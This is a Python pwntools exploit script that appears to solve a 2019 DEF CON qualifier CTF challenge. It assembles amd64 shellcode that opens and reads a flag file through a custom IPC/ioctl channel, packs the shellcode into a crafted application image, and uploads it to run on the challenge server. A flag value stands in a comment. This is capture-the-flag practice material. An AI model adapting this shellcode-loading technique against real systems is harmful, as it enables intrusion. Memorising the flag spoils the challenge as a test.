#!/usr/bin/env python
# -*- coding: utf-8 -*-
# OOO{60a80a7021ee5987ad2d47b339d84e4b}

from pwn import *   # pip install pwntools
context.arch = "amd64"

r = remote("lcars022.quals2019.oooverflow.io", 5000)
print r.recvuntil("init\n")

code = asm(
    shellcraft.pushstr("flag22.txt").ljust(16, "\0") + """
    /* file name */
    mov rdi, 0x30000000
    mov rsi, rsp
    mov rcx, 16
    rep movsb

    /* open fd */
    mov rdi, 5
    mov rsi, 0
    mov edx, 16
    call ioctl

    /* recvmsg */
    mov rdi, 0x30000200
    mov dword ptr [rdi+0x28], 0x100
    mov rax, 0x30000300
    mov dword ptr [rdi+0x20], eax

    mov eax, 0x2f
    mov rdi, 1
    mov rsi, 0x30000200
    mov rdx, 0x100
    syscall

    /* read flag*/
    mov rdi, 2
    mov rsi, 0x30000000
    mov rdx, 0x100
    call sys_read

    /* output */
    mov rdi, 0
    mov rsi, 0
    mov rdx, rax
    call ioctl

    mov rdi, 0x99
    call sys_exit

sys_read:
    xor eax, eax
    syscall
    ret

sys_write:
    mov eax, 1
    syscall
    ret

sys_exit:
    mov eax, 60
    syscall
    ret

ioctl:
    sub     rsp, 0x38
    mov     [rsp+0x14], esi
    lea     rsi, [rsp+0x10]
    mov     [rsp+0x10], edi
    mov     [rsp+0x18], edx
    xor     edi, edi
    mov     edx, 0x14
    mov     [rsp+0x1C], ecx
    mov     [rsp+0x20], r8d
    call    sys_write

    lea     rsi, [rsp+0x0C]
    mov     edx, 4
    mov     edi, 1
    mov     dword ptr [rsp+0x0C], 0
    call    sys_read

    mov     eax, [rsp+0x0C]
    add     rsp, 0x38
    ret

""").ljust(0x1000, "\x90")

app = "EFIL"
app += p32(4)
app = app.ljust(40, "\x00")

# stack
app += p32(0xEFFFC000+0x3000)  # addr
app += p32(0x1000)   # size
app += p32(3)        # prot
app += p64(0x30001000) * 512
# tls
app += p32(0x60000000)  # addr
app += p32(0x1000)      # size
app += p32(3)           # prot
app += p64(0x30001000) * 512
# map @ 0x30001000
app += p32(0x30001000) # addr
app += p32(0x1000)     # size
app += p32(5)
app += code
# unused code page
app += p32(0x200000)
app += p32(0x1000)   # size
app += p32(5)        # prot
app += "\x90" * 0x1000

r.sendline("download test.papp %d" % len(app))
r.send(app)
r.sendline("run test.papp")

r.interactive()
